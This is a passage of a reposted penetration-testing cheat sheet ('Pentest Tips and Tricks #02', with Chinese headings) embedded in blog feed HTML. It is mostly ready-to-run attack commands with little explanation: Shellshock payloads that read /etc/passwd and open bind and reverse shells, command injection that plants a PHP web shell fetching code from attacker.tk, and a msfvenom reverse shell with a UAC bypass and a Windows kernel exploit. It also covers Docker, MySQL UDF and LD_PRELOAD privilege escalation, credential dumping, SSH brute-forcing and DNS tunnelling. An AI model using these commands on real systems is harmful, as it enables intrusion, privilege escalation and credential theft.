--verbose</span><br><span class="line"></span><br><span class="line"># cat file</span><br><span class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; echo \$(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"># bind shell</span><br><span class="line">$ echo -e &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br><span class="line"></span><br><span class="line"># reverse Shell</span><br><span class="line">$ nc -l -p 443</span><br><span class="line">$ echo &quot;HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () &#123; :;&#125;; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n&quot; | nc 192.168.56.118 80</span><br></pre></td></tr></table></figure><h2 id="Root-with-Docker-以root的身份运行docker"><a href="#Root-with-Docker-以root的身份运行docker" class="headerlink" title="Root with Docker(以root的身份运行docker)"></a>Root with Docker(以root的身份运行docker)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># get root with docker</span><br><span class="line"># user must be in docker group</span><br><span class="line">ek@victum:~/docker-test$ id</span><br><span class="line">uid=1001(ek) gid=1001(ek) groups=1001(ek),114(docker)</span><br><span class="line"></span><br><span class="line">ek@victum:~$ mkdir docker-test</span><br><span class="line">ek@victum:~$ cd docker-test</span><br><span class="line"></span><br><span class="line">ek@victum:~$ cat &gt; Dockerfile</span><br><span class="line">FROM debian:wheezy</span><br><span class="line"></span><br><span class="line">ENV WORKDIR /stuff</span><br><span class="line"></span><br><span class="line">RUN mkdir -p $WORKDIR</span><br><span class="line"></span><br><span class="line">VOLUME [ $WORKDIR ]</span><br><span class="line"></span><br><span class="line">WORKDIR $WORKDIR</span><br><span class="line">&lt;&lt; EOF</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker build -t my-docker-image .</span><br><span class="line">ek@victum:~$ docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c \</span><br><span class="line">&apos;cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/sh&apos;</span><br><span class="line">./sh</span><br><span class="line">whoami</span><br><span class="line"># root</span><br><span class="line"></span><br><span class="line">ek@victum:~$ docker run -v /etc:/stuff -t my-docker-image /bin/sh -c &apos;cat /stuff/shadow&apos;</span><br></pre></td></tr></table></figure><h2 id="Tunneling-Over-DNS-to-Bypass-Firewall"><a href="#Tunneling-Over-DNS-to-Bypass-Firewall" class="headerlink" title="Tunneling Over DNS to Bypass Firewall"></a>Tunneling Over DNS to Bypass Firewall</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># Tunneling Data and Commands Over DNS to Bypass Firewalls</span><br><span class="line"># dnscat2 supports &quot;download&quot; and &quot;upload&quot; commands for getting files (data and programs) to and from # the victim’s host.</span><br><span class="line"></span><br><span class="line"># server (attacker)</span><br><span class="line">$ apt-get update</span><br><span class="line">$ apt-get -y install ruby-dev git make g++</span><br><span class="line">$ gem install bundler</span><br><span class="line">$ git clone https://github.com/iagox86/dnscat2.git</span><br><span class="line">$ cd dnscat2/server</span><br><span class="line">$ bundle install</span><br><span class="line">$ ruby ./dnscat2.rb</span><br><span class="line">dnscat2&gt; New session established: 16059</span><br><span class="line">dnscat2&gt; session -i 16059</span><br><span class="line"></span><br><span class="line"># client (victum)</span><br><span class="line"># https://downloads.skullsecurity.org/dnscat2/</span><br><span class="line"># https://github.com/lukebaggett/dnscat2-powershell</span><br><span class="line">$ dnscat --host &lt;dnscat server_ip&gt;</span><br></pre></td></tr></table></figure><h2 id="Compile-Assemble-code-编译汇编代码"><a href="#Compile-Assemble-code-编译汇编代码" class="headerlink" title="Compile Assemble code(编译汇编代码)"></a>Compile Assemble code(编译汇编代码)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ nasm -f elf32 simple32.asm -o simple32.o</span><br><span class="line">$ ld -m elf_i386 simple32.o simple32</span><br><span class="line"></span><br><span class="line">$ nasm -f elf64 simple.asm -o simple.o</span><br><span class="line">$ ld simple.o -o simple</span><br></pre></td></tr></table></figure><h2 id="Pivoting-to-Internal-Network-Via-Non-Interactive-Shell-通过非交互式外壳枢转到内部网络"><a href="#Pivoting-to-Internal-Network-Via-Non-Interactive-Shell-通过非交互式外壳枢转到内部网络" class="headerlink" title="Pivoting to Internal Network Via Non Interactive Shell(通过非交互式外壳枢转到内部网络)"></a>Pivoting to Internal Network Via Non Interactive Shell(通过非交互式外壳枢转到内部网络)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># generate ssh key with shell</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=whoami&quot;</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \&quot;\&quot; &quot;</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot;</span><br><span class="line"></span><br><span class="line"># add tempuser at attacker ps</span><br><span class="line">$ useradd -m tempuser</span><br><span class="line">$ mkdir /home/tempuser/.ssh &amp;&amp; chmod 700 /home/tempuser/.ssh</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=cat /tmp/id_rsa&quot; &gt; /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chmod 700 /home/tempuser/.ssh/authorized_keys</span><br><span class="line">$ chown -R tempuser:tempuser /home/tempuser/.ssh</span><br><span class="line"></span><br><span class="line"># create reverse ssh shell</span><br><span class="line">$ wget -O - -q &quot;http://domain.tk/sh.php?cmd=ssh -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;&quot;</span><br></pre></td></tr></table></figure><h2 id="Patator-is-a-multi-purpose-brute-forcer"><a href="#Patator-is-a-multi-purpose-brute-forcer" class="headerlink" title="Patator is a multi-purpose brute-forcer"></a>Patator is a multi-purpose brute-forcer</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># git clone https://github.com/lanjelot/patator.git /usr/share/patator</span><br><span class="line"></span><br><span class="line"># SMTP bruteforce</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 helo=&apos;ehlo 192.168.17.128&apos; user=FILE1 password=FILE0 0=/usr/share/john/password.lst 1=/usr/share/john/usernames.lst</span><br><span class="line">$ patator smtp_login host=192.168.17.129 user=Ololena password=FILE0 0=/usr/share/john/password.lst -x ignore:fgrep=&apos;incorrect password or account name&apos;</span><br></pre></td></tr></table></figure><h2 id="Metasploit-Web-terminal-via-Gotty"><a href="#Metasploit-Web-terminal-via-Gotty" class="headerlink" title="Metasploit Web terminal via Gotty"></a>Metasploit Web terminal via Gotty</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ service postgresql start</span><br><span class="line">$ msfdb init</span><br><span class="line">$ apt-get install golang</span><br><span class="line">$ mkdir /root/gocode</span><br><span class="line">$ export GOPATH=/root/gocode</span><br><span class="line">$ go get github.com/yudai/gotty</span><br><span class="line">$ gocode/bin/gotty -a 127.0.0.1 -w msfconsole</span><br><span class="line"># open in browser http://127.0.0.1:8080</span><br></pre></td></tr></table></figure><h2 id="Get-full-shell-with-POST-RCE"><a href="#Get-full-shell-with-POST-RCE" class="headerlink" title="Get full shell with POST RCE"></a>Get full shell with POST RCE</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Bwhoami&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</span><br><span class="line"></span><br><span class="line">attacker:~$ curl -i -s -k  -X &apos;POST&apos; --data-binary $&apos;IP=%3Becho+%27%3C%3Fphp+system%28%24_GET%5B%22cmd%22%5D%29%3B+%3F%3E%27+%3E+..%2Fshell.php&amp;submit=submit&apos; &apos;http://victum.tk/command.php&apos;</span><br><span class="line"></span><br><span class="line">attacker:~$ curl http://victum.tk/shell.php?cmd=id</span><br><span class="line"></span><br><span class="line"># download reverse shell to server (phpshell.php)</span><br><span class="line">http://victum.tk/shell.php?cmd=php%20-r%20%27file_put_contents%28%22phpshell.php%22,%20fopen%28%22http://attacker.tk/phpshell.txt%22,%20%27r%27%29%29;%27</span><br><span class="line"></span><br><span class="line"># run nc and execute phpshell.php</span><br><span class="line">attacker:~$ nc -nvlp 1337</span><br></pre></td></tr></table></figure><h2 id="Exiftool-Read-and-write-meta-information-in-files-读-写文件的元数据"><a href="#Exiftool-Read-and-write-meta-information-in-files-读-写文件的元数据" class="headerlink" title="Exiftool - Read and write meta information in files(读/写文件的元数据)"></a>Exiftool - Read and write meta information in files(读/写文件的元数据)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://www.sno.phy.queensu.ca/~phil/exiftool/Image-ExifTool-10.13.tar.gz</span><br><span class="line">$ tar xzf Image-ExifTool-10.13.tar.gz</span><br><span class="line">$ cd Image-ExifTool-10.13</span><br><span class="line">$ perl Makefile.PL</span><br><span class="line">$ make</span><br><span class="line">$ ./exiftool main.gif</span><br></pre></td></tr></table></figure><h2 id="Get-SYSTEM-with-Admin-reverse-shell-on-Win7"><a href="#Get-SYSTEM-with-Admin-reverse-shell-on-Win7" class="headerlink" title="Get SYSTEM with Admin reverse_shell on Win7"></a>Get SYSTEM with Admin reverse_shell on Win7</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msfvenom –p windows/shell_reverse_tcp LHOST=192.168.56.102 –f exe &gt; danger.exe</span><br><span class="line"></span><br><span class="line">#show account settings</span><br><span class="line">net user &lt;login&gt;</span><br><span class="line"></span><br><span class="line"># download psexec to kali</span><br><span class="line">https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx</span><br><span class="line"></span><br><span class="line"># upload psexec.exe file onto the victim machine with powershell script</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/PsExec.exe&quot; &gt;&gt; script.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;psexec.exe&quot;) &gt;&gt; script.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</span><br><span class="line"></span><br><span class="line"># upload danger.exe file onto the victim machine with powershell script</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/danger.exe&quot; &gt;&gt; script2.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;danger.exe&quot;) &gt;&gt; script2.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</span><br><span class="line"></span><br><span class="line"># UAC bypass from precompiled binaries:</span><br><span class="line">https://github.com/hfiref0x/UACME</span><br><span class="line"></span><br><span class="line"># upload https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe to victim pc with powershell</span><br><span class="line">echo $client = New-Object System.Net.WebClient &gt; script2.ps1</span><br><span class="line">echo $targetlocation = &quot;http://192.168.56.102/Akagi64.exe&quot; &gt;&gt; script3.ps1</span><br><span class="line">echo $client.DownloadFile($targetlocation,&quot;Akagi64.exe&quot;) &gt;&gt; script3.ps1</span><br><span class="line">powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1</span><br><span class="line"></span><br><span class="line"># create listener on kali</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># Use Akagi64 to run the danger.exe file with SYSTEM privileges</span><br><span class="line">Akagi64.exe 1 C:\Users\User\Desktop\danger.exe</span><br><span class="line"></span><br><span class="line"># create listener on kali</span><br><span class="line">nc -lvp 4444</span><br><span class="line"></span><br><span class="line"># The above step should give us a reverse shell with elevated privileges</span><br><span class="line"># Use PsExec to run the danger.exe file with SYSTEM privileges</span><br><span class="line">psexec.exe –i –d –accepteula –s danger.exe</span><br></pre></td></tr></table></figure><h2 id="Get-SYSTEM-with-Standard-user-reverse-shell-on-Win7"><a href="#Get-SYSTEM-with-Standard-user-reverse-shell-on-Win7" class="headerlink" title="Get SYSTEM with Standard user reverse_shell on Win7"></a>Get SYSTEM with Standard user reverse_shell on Win7</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051</span><br><span class="line">https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html</span><br><span class="line">https://www.exploit-db.com/exploits/37049/</span><br><span class="line"></span><br><span class="line"># check the list of patches applied on the target machine</span><br><span class="line"># to get the list of Hotfixes installed, type in the following command.</span><br><span class="line">wmic qfe get</span><br><span class="line">wmic qfe | find &quot;3057191&quot;</span><br><span class="line"></span><br><span class="line"># Upload compile exploit to victim machine and run it</span><br><span class="line">https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe</span><br><span class="line"></span><br><span class="line"># by default exploite exec cmd.exe with SYSTEM privileges, we need to change source code to run danger.exe</span><br><span class="line"># https://github.com/hfiref0x/CVE-2015-1701 download it and navigate to the file &quot;main.c&quot;</span><br><span class="line"></span><br><span class="line"># dump clear text password of the currently logged in user using wce.exe</span><br><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line">wce -w</span><br><span class="line"></span><br><span class="line"># dump hashes of other users with pwdump7</span><br><span class="line">http://www.heise.de/download/pwdump.html</span><br><span class="line"># we can try online hash cracking tools such crackstation.net</span><br></pre></td></tr></table></figure><h2 id="Generate-our-own-dic-file-based-on-the-website-content-根据网站内容生成我们自己的DIC文件"><a href="#Generate-our-own-dic-file-based-on-the-website-content-根据网站内容生成我们自己的DIC文件" class="headerlink" title="Generate our own dic file based on the website content(根据网站内容生成我们自己的DIC文件)"></a>Generate our own dic file based on the website content(根据网站内容生成我们自己的DIC文件)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cewl -m 4 -w dict.txt http://site.url</span><br><span class="line">$ john --wordlist=dict.txt --rules --stdout</span><br></pre></td></tr></table></figure><h2 id="Bruteforce-DNS-records-using-Nmap"><a href="#Bruteforce-DNS-records-using-Nmap" class="headerlink" title="Bruteforce DNS records using Nmap"></a>Bruteforce DNS records using Nmap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ nmap --script dns-brute --script-args dns-brute.domain=foo.com,dns-brute.threads=6,dns-brute.hostlist=./hostfile.txt,newtargets -sS -p 80</span><br><span class="line">$ nmap --script dns-brute www.foo.com</span><br></pre></td></tr></table></figure><h2 id="Identifying-a-WAF-with-Nmap-使用nmap识别waf"><a href="#Identifying-a-WAF-with-Nmap-使用nmap识别waf" class="headerlink" title="Identifying a WAF with Nmap(使用nmap识别waf)"></a>Identifying a WAF with Nmap(使用nmap识别waf)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -p 80,443 --script=http-waf-detect 192.168.56.102</span><br><span class="line">$ nmap -p 80,443 --script=http-waf-fingerprint 192.168.56.102</span><br><span class="line">$ wafw00f www.example.com</span><br></pre></td></tr></table></figure><h2 id="MS08-067-without-the-use-of-Metasploit"><a href="#MS08-067-without-the-use-of-Metasploit" class="headerlink" title="MS08-067 - without the use of Metasploit"></a>MS08-067 - without the use of Metasploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205</span><br><span class="line">$ searchsploit ms08-067</span><br><span class="line">$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1</span><br></pre></td></tr></table></figure><h2 id="Nikto-scan-with-SQUID-proxy"><a href="#Nikto-scan-with-SQUID-proxy" class="headerlink" title="Nikto scan with SQUID proxy"></a>Nikto scan with SQUID proxy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nikto -useproxy http://squid_ip:3128 -h http://target_ip</span><br></pre></td></tr></table></figure><h2 id="Hijack-a-binary’s-full-path-in-bash-to-exec-your-own-code-劫持一个二进制的完整路径，以执行自己的代码"><a href="#Hijack-a-binary’s-full-path-in-bash-to-exec-your-own-code-劫持一个二进制的完整路径，以执行自己的代码" class="headerlink" title="Hijack a binary’s full path in bash to exec your own code(劫持一个二进制的完整路径，以执行自己的代码)"></a>Hijack a binary’s full path in bash to exec your own code(劫持一个二进制的完整路径，以执行自己的代码)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ function /usr/bin/foo () &#123; /usr/bin/echo &quot;It works&quot;; &#125;</span><br><span class="line">$ export -f /usr/bin/foo</span><br><span class="line">$ /usr/bin/foo</span><br><span class="line">It works</span><br></pre></td></tr></table></figure><h2 id="Local-privilege-escalation-through-MySQL-run-with-root-privileges-本地特权升级通过MySQL运行root权限"><a href="#Local-privilege-escalation-through-MySQL-run-with-root-privileges-本地特权升级通过MySQL运行root权限" class="headerlink" title="Local privilege escalation through MySQL run with root privileges(本地特权升级通过MySQL运行root权限)"></a>Local privilege escalation through MySQL run with root privileges(本地特权升级通过MySQL运行root权限)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)</span><br><span class="line">$ wget 0xdeadbeef.info/exploits/raptor_udf2.c</span><br><span class="line">$ gcc -g -c raptor_udf2.c</span><br><span class="line">$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">mysql -u root -p</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">mysql&gt; insert into foo values(load_file(&apos;/home/user/raptor_udf2.so&apos;));</span><br><span class="line">mysql&gt; select * from foo into dumpfile &apos;/usr/lib/mysql/plugin/raptor_udf2.so&apos;;</span><br><span class="line">mysql&gt; create function do_system returns integer soname &apos;raptor_udf2.so&apos;;</span><br><span class="line">mysql&gt; select * from mysql.func;</span><br><span class="line">mysql&gt; select do_system(&apos;echo &quot;root:passwd&quot; | chpasswd &gt; /tmp/out; chown user:user /tmp/out&apos;);</span><br><span class="line"></span><br><span class="line">user:~$ su -</span><br><span class="line">Password:</span><br><span class="line">user:~# whoami</span><br><span class="line">root</span><br><span class="line">root:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure><h2 id="Bruteforce-SSH-login-with-patator-通过patator爆破ssh登陆"><a href="#Bruteforce-SSH-login-with-patator-通过patator爆破ssh登陆" class="headerlink" title="Bruteforce SSH login with patator(通过patator爆破ssh登陆)"></a>Bruteforce SSH login with patator(通过patator爆破ssh登陆)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:~# patator ssh_login host=192.168.0.18 user=FILE0 password=FILE1 0=word.txt 1=word.txt -x ignore:mesg=&apos;Authentication failed.&apos;</span><br></pre></td></tr></table></figure><h2 id="Using-LD-PRELOAD-to-inject-features-to-programs"><a href="#Using-LD-PRELOAD-to-inject-features-to-programs" class="headerlink" title="Using LD_PRELOAD to inject features to programs"></a>Using LD_PRELOAD to inject features to programs</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/jivoi/pentest/ldpreload_shell.c</span><br><span class="line">$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so</span><br><span class="line">$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft</span><br></pre></td></tr></table></figure><h2 id="Exploit-the-OpenSSH-User-Enumeration-Timing-Attack"><a href="#Exploit-the-OpenSSH-User-Enumeration-Timing-Attack" class="headerlink" title="Exploit the OpenSSH User Enumeration Timing Attack"></a>Exploit the OpenSSH User Enumeration Timing Attack</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/c0r3dump3d/osueta</span><br><span class="line">$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes</span><br><span class="line">$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt</span><br></pre></td></tr></table></figure><h2 id="Create-a-TCP-circuit-through-validly-formed-HTTP-requests-with-ReDuh"><a href="#Create-a-TCP-circuit-through-validly-formed-HTTP-requests-with-ReDuh" class="headerlink" title="Create a TCP circuit through validly formed HTTP requests with ReDuh"></a>Create a TCP circuit through validly formed HTTP requests with ReDuh</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/sensepost/reDuh</span><br><span class="line"></span><br><span class="line"># step 1</span><br><span class="line"># upload reDuh.jsp to victim server</span><br><span class="line">$ http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"># step 2</span><br><span class="line"># run reDuhClient on attacker</span><br><span class="line">$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp</span><br><span class="line"></span><br><span class="line"># step 3</span><br><span class="line"># connecting to management port with nc</span><br><span class="line">$ nc -nvv 127.0.0.1 1010</span><br><span class="line"></span><br><span class="line"># step 4</span><br><span class="line"># forward localport to remote port with tunnel</span><br><span class="line">[createTunnel] 7777:172.16.0.4:3389</span><br><span class="line"></span><br><span class="line"># step 5</span><br><span class="line"># connect to localhost with rdp</span><br><span class="line">$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;渗透测试常用技巧和窍门第一部分，来自国外的EK，&lt;a href=&quot;https://jivoi.github.io/2015/08/21/pentest-tips-and-tricks-number-2/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;看原文的走这。&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;Pentest-Tips-and-Tricks-02-渗透测试的技巧和窍门&quot;&gt;&lt;a href=&quot;#Pentest-Tips-and-Tricks-02-渗透测试的技巧和窍门&quot; class=&quot;headerlink&quot; title=&quot;Pentest Tips and Tricks #02(渗透测试的技巧和窍门)&quot;&gt;&lt;/a&gt;Pentest Tips and Tricks #02(渗透测试的技巧和窍门)&lt;/h1&gt;&lt;h2 id=&quot;Tor-Nat-Traversal&quot;&gt;&lt;a href=&quot;#Tor-Nat-Traversal&quot; class=&quot;headerlink&quot; title=&quot;Tor Nat Traversal&quot;&gt;&lt;/a&gt;Tor Nat Traversal&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span 